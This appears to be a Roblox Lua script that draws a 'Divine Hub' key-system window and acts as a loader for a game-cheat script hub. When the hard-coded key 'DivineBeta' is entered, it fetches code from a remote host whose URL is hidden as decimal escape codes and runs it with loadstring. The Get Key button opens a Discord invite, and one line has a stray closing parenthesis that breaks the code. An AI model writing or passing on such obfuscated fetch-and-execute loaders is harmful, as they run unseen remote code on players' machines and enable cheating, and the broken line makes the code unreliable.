local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Divine_KeySystem"
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

local KeySystemUI = Instance.new("Frame")
KeySystemUI.Name = "KeySystemUI"
KeySystemUI.Parent = ScreenGui
KeySystemUI.BorderSizePixel = 0
KeySystemUI.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
KeySystemUI.Size = UDim2.new(0.48901, 0, 0.61589, 0)
KeySystemUI.Position = UDim2.new(0.27198, 0, 0.15232, 0)
KeySystemUI.BackgroundTransparency = 0.35

local UICorner = Instance.new("UICorner")
UICorner.Parent = KeySystemUI
UICorner.CornerRadius = UDim.new(0, 50)

local UIStroke = Instance.new("UIStroke")
UIStroke.Parent = KeySystemUI
UIStroke.Thickness = 2
UIStroke.Color = Color3.fromRGB(34, 186, 255)

local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Parent = KeySystemUI
Title.BorderSizePixel = 0
Title.TextSize = 22
Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Title.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
Title.TextColor3 = Color3.fromRGB(34, 186, 255)
Title.BackgroundTransparency = 0.45
Title.Size = UDim2.new(0.80899, 0, 0.2043, 0)
Title.Position = UDim2.new(0.09551, 0, 0.05376, 0)
Title.Text = "Divine Hub"

local TitleStroke = Instance.new("UIStroke")
TitleStroke.Parent = Title
TitleStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
TitleStroke.Thickness = 2
TitleStroke.Color = Color3.fromRGB(34, 186, 255)

local TitleCorner = Instance.new("UICorner")
TitleCorner.Parent = Title

local TitleStroke2 = Instance.new("UIStroke")
TitleStroke2.Parent = Title

local KeyBox = Instance.new("TextBox")
KeyBox.Name = "KeyBox"
KeyBox.Parent = KeySystemUI
KeyBox.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
KeyBox.BorderSizePixel = 0
KeyBox.TextSize = 15
KeyBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
KeyBox.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
KeyBox.PlaceholderText = "KEY HERE"
KeyBox.Size = UDim2.new(0.92135, 0, 0.29032, 0)
KeyBox.Position = UDim2.new(0.03933, 0, 0.31183, 0)
KeyBox.Text = ""

local KeyCorner = Instance.new("UICorner")
KeyCorner.Parent = KeyBox
KeyCorner.CornerRadius = UDim.new(0, 25)

local KeyStroke = Instance.new("UIStroke")
KeyStroke.Parent = KeyBox
KeyStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
KeyStroke.Thickness = 2
KeyStroke.Color = Color3.fromRGB(34, 186, 255)

local KeyStroke2 = Instance.new("UIStroke")
KeyStroke2.Parent = KeyBox
KeyStroke2.Color = Color3.fromRGB(34, 186, 255)

local VerifyKeyBTN = Instance.new("TextButton")
VerifyKeyBTN.Name = "VerifyKeyBTN"
VerifyKeyBTN.Parent = KeySystemUI
VerifyKeyBTN.BorderSizePixel = 0
VerifyKeyBTN.TextSize = 15
VerifyKeyBTN.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
VerifyKeyBTN.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
VerifyKeyBTN.Size = UDim2.new(0.30337, 0, 0.1828, 0)
VerifyKeyBTN.Position = UDim2.new(0.0618, 0, 0.70968, 0)
VerifyKeyBTN.Text = "Verify Key"

local VerifyCorner = Instance.new("UICorner")
VerifyCorner.Parent = VerifyKeyBTN

local VerifyStroke = Instance.new("UIStroke")
VerifyStroke.Parent = VerifyKeyBTN
VerifyStroke.Color = Color3.fromRGB(34, 186, 255)

local VerifyStroke2 = Instance.new("UIStroke")
VerifyStroke2.Parent = VerifyKeyBTN
VerifyStroke2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
VerifyStroke2.Thickness = 2
VerifyStroke2.Color = Color3.fromRGB(34, 186, 255)

local GetKeyBTN = Instance.new("TextButton")
GetKeyBTN.Name = "GetKeyBTN"
GetKeyBTN.Parent = KeySystemUI
GetKeyBTN.BorderSizePixel = 0
GetKeyBTN.TextSize = 15
GetKeyBTN.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
GetKeyBTN.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
GetKeyBTN.Size = UDim2.new(0.30337, 0, 0.1828, 0)
GetKeyBTN.Position = UDim2.new(0.63483, 0, 0.70968, 0)
GetKeyBTN.Text = "Get Key"

local GetCorner = Instance.new("UICorner")
GetCorner.Parent = GetKeyBTN

local GetStroke = Instance.new("UIStroke")
GetStroke.Parent = GetKeyBTN
GetStroke.Color = Color3.fromRGB(34, 186, 255)

local GetStroke2 = Instance.new("UIStroke")
GetStroke2.Parent = GetKeyBTN
GetStroke2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
GetStroke2.Thickness = 2
GetStroke2.Color = Color3.fromRGB(34, 186, 255)

local Drag = Instance.new("UIDragDetector")
Drag.Parent = KeySystemUI

local Cosmetic1 = Instance.new("Frame")
Cosmetic1.Name = "Cosmetic1"
Cosmetic1.Parent = KeySystemUI
Cosmetic1.BorderSizePixel = 0
Cosmetic1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Cosmetic1.Size = UDim2.new(1.04494, 0, 1.08602, 0)
Cosmetic1.Position = UDim2.new(-0.02247, 0, -0.03226, 0)
Cosmetic1.BackgroundTransparency = 1

local CosmeticCorner = Instance.new("UICorner")
CosmeticCorner.Parent = Cosmetic1
CosmeticCorner.CornerRadius = UDim.new(0, 50)

local CosmeticStroke = Instance.new("UIStroke")
CosmeticStroke.Parent = Cosmetic1
CosmeticStroke.Thickness = 2
CosmeticStroke.Color = Color3.fromRGB(34, 186, 255)

local BottomPanel = Instance.new("Frame")
BottomPanel.Name = "BottomPanel"
BottomPanel.Parent = KeySystemUI
BottomPanel.BorderSizePixel = 0
BottomPanel.BackgroundColor3 = Color3.fromRGB(34, 186, 255)
BottomPanel.Size = UDim2.new(0.88202, 0, 0.01075, 0)
BottomPanel.Position = UDim2.new(0.0618, 0, 1.08602, 0)

local BottomCorner = Instance.new("UICorner")
BottomCorner.Parent = BottomPanel
BottomCorner.CornerRadius = UDim.new(0, 899)

local UpperPanel = Instance.new("Frame")
UpperPanel.Name = "UpperPanel"
UpperPanel.Parent = KeySystemUI
UpperPanel.BorderSizePixel = 0
UpperPanel.BackgroundColor3 = Color3.fromRGB(34, 186, 255)
UpperPanel.Size = UDim2.new(0.88202, 0, 0.01075, 0)
UpperPanel.Position = UDim2.new(0.06742, 0, -0.08602, 0)

local UpperCorner = Instance.new("UICorner")
UpperCorner.Parent = UpperPanel
UpperCorner.CornerRadius = UDim.new(0, 899)

local Aspect = Instance.new("UIAspectRatioConstraint")
Aspect.Parent = KeySystemUI
Aspect.AspectRatio = 1.91398

if VerifyKeyBTN and GetKeyBTN then
    VerifyKeyBTN.MouseButton1Click:Connect(function()
        local Key = KeyBox.Text
        if Key == "DivineBeta" then
            KeySystemUI:Destroy()
            loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\118\115\115\46\112\97\110\100\97\100\101\118\101\108\111\112\109\101\110\116\46\110\101\116\47\118\105\114\116\117\97\108\47\102\105\108\101\47\55\100\100\49\98\55\102\98\54\53\57\98\52\97\100\52"))()
        else
            KeyBox.Text = ""
            KeyBox.PlaceholderText = "Invalid Key"
        end
    end)

    GetKeyBTN.MouseButton1Click:Connect(function()
        game:GetService("GuiService"):OpenBrowserWindow("https://discord.gg/mjjfB4R69r"))
    end)
end

if Drag then
    Drag.DragBegin:Connect(function()
        local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
        local StartPos = KeySystemUI.Position
        local StartMousePosition = Vector2.new(Mouse.X, Mouse.Y)
        local Connection 
        Connection = Mouse.Move:Connect(function()
            local Delta = Vector2.new(Mouse.X, Mouse.Y) - StartMousePosition
            KeySystemUI.Position = UDim2.new(StartPos.X.Scale, StartPos.X.Offset + Delta.X, StartPos.Y.Scale, StartPos.Y.Offset + Delta.Y)
        end)
    end)
end